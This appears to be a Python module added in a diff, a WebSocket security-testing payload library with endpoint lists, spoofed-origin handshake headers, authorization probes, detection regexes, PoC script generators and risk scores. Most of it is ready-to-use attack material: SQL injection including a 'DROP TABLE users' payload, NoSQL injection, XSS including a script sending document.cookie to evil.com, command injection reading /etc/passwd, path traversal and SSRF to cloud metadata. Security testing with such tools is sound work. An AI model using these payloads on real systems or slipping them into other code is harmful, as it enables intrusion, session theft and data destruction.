@@ -1,0 +1,213 @@
+"""
+WebSocket Security Payload Database
+Project #37: WebSocket Security Testing
+"""
+
+# ==================================================================== #
+# 1. COMMON WEBSOCKET ENDPOINTS
+# ==================================================================== #
+COMMON_WS_PATHS = [
+    '/ws',
+    '/websocket',
+    '/websockets',
+    '/socket',
+    '/socket.io/',
+    '/sockjs/',
+    '/signalr',
+    '/signalr/negotiate',
+    '/chat',
+    '/live',
+    '/realtime',
+    '/graphql-ws',
+    '/subscriptions',
+    '/api/ws',
+    '/api/websocket',
+]
+
+# Socket.IO-specific handshake parameters (query string)
+SOCKET_IO_PARAMS = '?EIO=4&transport=websocket'
+
+# ==================================================================== #
+# 2. WEBSOCKET SUBPROTOCOLS
+# ==================================================================== #
+WS_SUBPROTOCOLS = [
+    'graphql-ws',
+    'graphql-transport-ws',
+    'mqtt',
+    'stomp',
+    'v10.stomp',
+    'v11.stomp',
+    'v12.stomp',
+    'wamp',
+    'soap',
+    'json',
+    'chat',
+]
+
+# ==================================================================== #
+# 3. HANDSHAKE TEST HEADERS
+# ==================================================================== #
+HANDSHAKE_TESTS = {
+    'no_origin':         {},                          # No Origin header
+    'origin_evil':       {'Origin': 'https://evil.example.com'},
+    'origin_null':       {'Origin': 'null'},
+    'origin_spoof':      {'Origin': 'https://target.com'},
+    'origin_localhost':  {'Origin': 'http://localhost:5000'},
+    'no_auth':           {},                          # No Cookie
+    'fake_auth':         {'Cookie': 'session=fake_session_token'},
+    'cross_origin':      {'Origin': 'https://attacker.evil.com',
+                          'Cookie': 'session=victim_session'},
+}
+
+# ==================================================================== #
+# 4. INJECTION PAYLOADS
+# ==================================================================== #
+INJECTION_PAYLOADS = {
+    'sqli': [
+        {'id': "1' OR '1'='1"},
+        {'id': "1' UNION SELECT NULL--"},
+        {'id': "1; DROP TABLE users--"},
+        {'username': "admin' --"},
+    ],
+    'nosqli': [
+        {'id': {"$ne": None}},
+        {'id': {"$gt": ""}},
+        {'username': {"$regex": ".*"}},
+    ],
+    'xss': [
+        {'message': '<script>alert(1)</script>'},
+        {'message': '<img src=x onerror=alert(1)>'},
+        {'message': '<svg/onload=alert(1)>'},
+        {'text': '<script>fetch("http://evil.com/"+document.cookie)</script>'},
+    ],
+    'cmdi': [
+        {'cmd': '; whoami'},
+        {'cmd': '| id'},
+        {'cmd': '$(whoami)'},
+        {'cmd': '`uname -a`'},
+        {'cmd': '; cat /etc/passwd'},
+    ],
+    'path_traversal': [
+        {'path': '../../../etc/passwd'},
+        {'file': '..%2f..%2fetc%2fpasswd'},
+    ],
+    'ssrf': [
+        {'url': 'http://169.254.169.254/latest/meta-data/'},
+        {'url': 'http://127.0.0.1:22/'},
+    ],
+}
+
+# ==================================================================== #
+# 5. AUTHORIZATION TESTS
+# ==================================================================== #
+AUTH_TEST_PAYLOADS = [
+    {'type': 'join_room', 'room': 'admin'},
+    {'type': 'join_room', 'room': 'private'},
+    {'action': 'get_users'},
+    {'action': 'admin_list'},
+    {'command': 'list_all_users'},
+    {'channel': 'admin'},
+]
+
+# ==================================================================== #
+# 6. RATE LIMIT PAYLOADS
+# ==================================================================== #
+RATE_LIMIT_PAYLOAD = {'type': 'ping', 'payload': 'x'}
+
+LARGE_PAYLOAD_SIZES = [
+    1024,               # 1 KB
+    10240,              # 10 KB
+    102400,             # 100 KB
+    1048576,            # 1 MB
+]
+
+# ==================================================================== #
+# 7. DETECTION SIGNATURES
+# ==================================================================== #
+WS_SUCCESS_SIGNATURES = {
+    'sql_error':       r'SQL syntax|mysql_|SQLSTATE|ORA-\d+|sqlite',
+    'xss_reflected':   r'<script>alert|<img[^>]+onerror|<svg[^>]+onload',
+    'cmdi_success':    r'uid=\d+|gid=\d+|root:x:0:0:',
+    'nosqli_success':  r'"\$ne"|"users"|\bemail\b',
+    'admin_access':    r'admin.{0,20}(true|yes|granted|allowed)',
+    'file_read':       r'root:x:0:0|/bin/bash|/bin/sh',
+    'rate_limited':    r'429|too many|rate limit|flood',
+}
+
+HANDSHAKE_101 = b'HTTP/1.1 101'
+
+# ==================================================================== #
+# 8. POC TEMPLATES
+# ==================================================================== #
+def python_poc(ws_url, payload, description, headers=None):
+    """Generate a Python PoC using websocket-client."""
+    hdr_lines = ''
+    if headers:
+        hdr_lines = 'extra_headers = {\n'
+        for k, v in headers.items():
+            hdr_lines += f'    "{k}": "{v}",\n'
+        hdr_lines += '}\n'
+    else:
+        hdr_lines = 'extra_headers = {}\n'
+
+    return f'''#!/usr/bin/env python3
+"""
+PoC: {description}
+Auto-generated by websocket_toolkit.py
+"""
+import json
+from websocket import create_connection
+
+WS_URL = "{ws_url}"
+{hdr_lines}
+
+ws = create_connection(WS_URL, header=[f"{{k}}: {{v}}" for k, v in extra_headers.items()], timeout=10)
+print("[+] Connected")
+
+payload = {payload}
+ws.send(json.dumps(payload))
+print(f"[*] Sent: {{payload}}")
+
+try:
+    resp = ws.recv()
+    print(f"[*] Received: {{resp[:500]}}")
+except Exception as e:
+    print(f"[!] Recv error: {{e}}")
+
+ws.close()
+'''
+
+def bash_poc(ws_url, payload, description):
+    """Bash PoC using websocat or curl."""
+    return f'''#!/bin/bash
+# PoC: {description}
+# Uses websocat: https://github.com/vi/websocat
+
+WS_URL="{ws_url}"
+PAYLOAD='{payload}'
+
+echo "$PAYLOAD" | websocat "$WS_URL"
+'''
+
+# ==================================================================== #
+# 9. RISK SCORING
+# ==================================================================== #
+def score(issue_type):
+    scores = {
+        'sqli':              'CRITICAL',
+        'cmdi':              'CRITICAL',
+        'ssrf':              'CRITICAL',
+        'file_read':         'CRITICAL',
+        'xss_stored':        'HIGH',
+        'xss_reflected':     'MEDIUM',
+        'nosqli':            'CRITICAL',
+        'csrsh':             'CRITICAL',
+        'origin_missing':    'HIGH',
+        'no_auth':           'CRITICAL',
+        'weak_auth':         'HIGH',
+        'unauthorized':      'HIGH',
+        'admin_access':      'CRITICAL',
+        'no_rate_limit':     'MEDIUM',
+        'large_payload':     'MEDIUM',
+    }
+    return scores.get(issue_type, 'MEDIUM')
